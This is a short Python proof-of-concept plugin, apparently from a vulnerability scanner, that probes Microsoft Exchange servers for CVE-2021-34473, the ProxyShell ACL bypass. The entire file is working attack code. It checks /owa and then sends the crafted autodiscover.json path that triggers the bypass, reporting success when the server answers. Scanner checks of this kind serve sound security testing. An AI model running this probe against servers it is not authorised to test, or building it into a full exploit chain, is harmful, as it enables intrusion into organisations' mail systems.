# https://saucer-man.com/information_security/776.html
# CVE-2021-34473 Microsoft Exchange ACL绕过漏洞

from lib.core.Request import request
import requests
from plugin.target_parse import get_standard_url

def poc(url):
    if not url.startswith("http"):
        url = "https://" + url
    url = get_standard_url(url)
    try:
        r1 = request.get(url+ "/owa", timeout=5,verify=False, allow_redirects=False)
        # print(r1.text)
        if r1.status_code !=200:
            return False
        
        r2 = request.get(url+ "/autodiscover/autodiscover.json?@abc.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@abc.com", timeout=5,verify=False, allow_redirects=False)
        if r2.status_code==200 and "Exchange" in r2.text:
            return True
    except Exception as e:
        # print(e)
        pass

    return False